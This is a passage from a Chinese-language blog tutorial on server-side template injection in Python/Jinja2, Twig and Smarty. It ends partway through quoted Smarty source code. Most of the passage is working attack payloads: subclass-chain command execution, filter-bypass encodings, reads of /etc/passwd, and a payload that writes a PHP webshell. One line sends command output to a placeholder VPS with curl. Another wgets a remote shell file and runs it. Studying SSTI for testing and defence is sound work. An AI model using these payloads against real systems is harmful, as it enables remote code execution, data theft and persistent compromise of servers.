此属性是由类组成的元组，在方法解析期间会基于它来查找基类,返回所有直接或间接的基类(父类),同时也返回自身，按照调用顺序，自身是元组中的第一个,object是最后一个,因此也用&#x27;&#x27;.__class__.__mro__[-1]方式得到object</span></span><br><span class="line">__subclasses__()     <span class="comment"># 返回这个类的子类集合(子类没有间接性)</span></span><br><span class="line">__init__             <span class="comment"># 初始化类，返回的类型是function</span></span><br><span class="line">__globals__          <span class="comment"># 使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。(使用场景:类.__init__.globals)</span></span><br><span class="line">__dict__             <span class="comment"># 类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span></span><br><span class="line">__getattribute__()   <span class="comment"># 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span></span><br><span class="line">__getitem__()        <span class="comment"># 调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span></span><br><span class="line">__builtins__         <span class="comment"># 内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span></span><br><span class="line"><span class="built_in">__import__</span>           <span class="comment"># 动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read() 得到ls命令执行结果</span></span><br><span class="line">__str__()            <span class="comment"># 返回描写这个对象的字符串，可以理解成就是打印出来。</span></span><br></pre></td></tr></table></figure></div><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032356329.png"                                     ></p><h2 id="利用eval内建函数执行命令–payload理解"><a href="#利用eval内建函数执行命令–payload理解" class="headerlink" title="利用eval内建函数执行命令–payload理解"></a>利用eval内建函数执行命令–payload理解</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__ <span class="comment"># 获取到object</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>] <span class="comment"># 利用脚本的找到_frozen_importlib_external.FileLoader类，下标每一次都不一定一样</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">99</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls +/&#x27;).read()&quot;</span>) <span class="comment"># 利用该类含有builtins类中的内建eval执行命令，os模块中的popen函数与system函数都能用于执行系统命令，但是system函数不会返回命令执行结果</span></span><br></pre></td></tr></table></figure></div><blockquote><p>执行system函数，打印出0，表示命令执行成功；否则表示失败</p><p>os.popen()返回的是 <strong>file read</strong> 的对象，对其进行读取read()操作可以看到执行的输出</p><p>注意：在想要使用<code>popen</code>搭配几个<code>read</code>函数获取命令执行结果时请务必注意换行符<code>\n</code>，进行字符串处理时需对该<code>\n</code>符进行处理</p></blockquote><h3 id="💡Tips–几个含有eval函数的类"><a href="#💡Tips–几个含有eval函数的类" class="headerlink" title="💡Tips–几个含有eval函数的类"></a>💡Tips–几个含有eval函数的类</h3><ul><li>warnings.catch_warnings</li><li>WarningMessage</li><li>codecs.IncrementalEncoder</li><li>codecs.IncrementalDecoder</li><li>codecs.StreamReaderWriter</li><li>os._wrap_close</li><li>reprlib.Repr</li><li>weakref.finalize</li><li>_frozen_importlib_external.FileLoader</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 寻找eval脚本</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1:5000/?id=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"> <span class="comment"># 也可以寻找builtins类，其类下有内建函数eval子类</span></span><br></pre></td></tr></table></figure></div><blockquote><p><code>__builtins__</code>为内建模块 builtin存在于python2中，而在python3中被命名为builtins，<code>__builtins__</code>实际上是<code>__builtin__</code>和<code>builtins</code>的引用</p></blockquote><h3 id="函数关键字绕过"><a href="#函数关键字绕过" class="headerlink" title="函数关键字绕过"></a>函数关键字绕过</h3><p>利用<code>__dict__</code>方法，</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>利用<code>__getattribute__</code>方法绕过 </p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sys&#x27;</span>] <span class="comment"># 拼接</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span><span class="string">&quot;ss__&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__ssalc__&quot;</span>[::-<span class="number">1</span>]) <span class="comment"># 反转</span></span><br></pre></td></tr></table></figure></div><p>ascii转换</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>[<span class="string">&quot;%c%c%c%c%c%c%c%c%c&quot;</span>|<span class="built_in">format</span>(<span class="number">95</span>,<span class="number">95</span>,<span class="number">99</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">95</span>)] <span class="comment"># 等价于&quot;&quot;.__class__</span></span><br></pre></td></tr></table></figure></div><p>system函数代替popen,配合vps与curl命令</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls &gt; tt.txt &amp; cat tt.txt | xargs -I &#123;&#125; curl http://vps公网IP地址/?&#123;&#125;&#x27;</span>)  <span class="comment"># 这里用到了xargs来传递管道参数，xargs的一个选项-I，使用-I指定一个替换字符串&#123;&#125;，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次</span></span><br></pre></td></tr></table></figure></div><h3 id="点号-绕过"><a href="#点号-绕过" class="headerlink" title="点号.绕过"></a>点号<code>.</code>绕过</h3><p>利用<code>attr</code>绕过 e.g. <code>&quot;&quot;|attr(&quot;__class__&quot;) </code> 相当于 <code>&quot;&quot;.__class__</code></p><p>利用<code>[]</code>绕过 e.g. <code>&#123;&#123;"".__class__&#125;&#125;</code>相当于 <code>&#123;&#123;""['__classs__']&#125;&#125;</code></p><h3 id="中括号-绕过"><a href="#中括号-绕过" class="headerlink" title="中括号[]绕过"></a>中括号<code>[]</code>绕过</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;  <span class="comment"># setdefault 函数的功能：获取某个 key 的value，若 key 不存在于字典中，将会添加 key 并将 value 设为默认值</span></span><br></pre></td></tr></table></figure></div><h3 id="下划线-绕过"><a href="#下划线-绕过" class="headerlink" title="下划线_绕过"></a>下划线<code>_</code>绕过</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5F\x5Fbases\x5F\x5F&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;get\x5Fdata&quot;</span>](<span class="number">0</span>, <span class="string">&quot;app\x2Epy&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#也就是</span></span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">91</span>].get_data(<span class="number">0</span>,<span class="string">&quot;app.py&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>“\x5f”是字符 ”_“，”\x2E”是字符 “.”。</p></blockquote><h2 id="PHP中的SSTI"><a href="#PHP中的SSTI" class="headerlink" title="PHP中的SSTI"></a>PHP中的SSTI</h2><p>php常见的模板：twig，smarty，blade</p><h2 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;\twig\lib\Twig\Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">Twig_Environment</span>(<span class="keyword">new</span> <span class="title class_">Twig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&quot;name&quot;</span>]));  <span class="comment">// 将用户输入作为模版变量的值</span></span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。</p><p>render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板</p><blockquote><p>但即使向name传入js代码进行渲染也不能成功，因为模版引擎一般都默认对渲染的变量值进行编码和转义</p></blockquote><h3 id="渲染的模版内容受到用户的控制"><a href="#渲染的模版内容受到用户的控制" class="headerlink" title="渲染的模版内容受到用户的控制"></a>渲染的模版内容受到用户的控制</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">　　<span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class="line">　　<span class="title class_">Twig_Autoloader</span>::<span class="title function_ invoke__">register</span>(<span class="literal">true</span>);</span><br><span class="line">　　<span class="variable">$twig</span>=<span class="title function_ invoke__">newTwig_Environment</span>(<span class="title function_ invoke__">newTwig_Loader_String</span>());</span><br><span class="line">　　<span class="variable">$output</span>=<span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);<span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line">　　<span class="keyword">echo</span> <span class="variable">$output</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>此时可以传入js代码或其他表达式等，会被成功执行</p></blockquote><h3 id="判断技巧"><a href="#判断技巧" class="headerlink" title="判断技巧"></a>判断技巧</h3><p>  作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示</p><p>因此可以得到以下判断流程图</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032356913.jpg"                      alt="image-20220816200203853"                ><figcaption>image-20220816200203853</figcaption></figure></p><p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$what&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;%$a%&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div><blockquote><p>可以注入了探测字符串 $579，以查看应用程序是否进行了相应的计算</p></blockquote><p>在这里提供一个针对twig的攻击载荷：</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;ls&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><blockquote><p>可以填入系统命令执行</p></blockquote><p>模板注入远程下载shell，并重命名运行</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php&quot;</span>)&#125;&#125;</span></span><br></pre></td></tr></table></figure></div><p>以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload：</p><div class="highlight-container" data-rel="Twig"><figure class="iseeu highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="string">&#x27;/etc/passwd&#x27;</span><span class="punctuation">|</span><span class="keyword">file_excerpt</span>(<span class="number">1</span>,<span class="number">30</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).__construct(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;app.request.files.get(<span class="number">1</span>).openFile.fread(<span class="number">99</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;_self.env.enableDebug()&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.isDebug()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>]<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)</span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>,0]<span class="punctuation">|</span><span class="keyword">sort</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[0,0]<span class="punctuation">|</span><span class="keyword">reduce</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure></div><p><a class="link"   href="https://xz.aliyun.com/t/7518#toc-5" >TWIG 全版本通用 SSTI payloads - 先知社区 (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p><blockquote><p><code>$smarty</code>内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p></blockquote><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5942j1v17j20zq0kc0ut.jpg"                      alt="image-20220817011709847"                ><figcaption>image-20220817011709847</figcaption></figure></p><p>因此我们可以用这个方法读文件，payload:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();</span><br><span class="line">        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Smarty</span>::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, 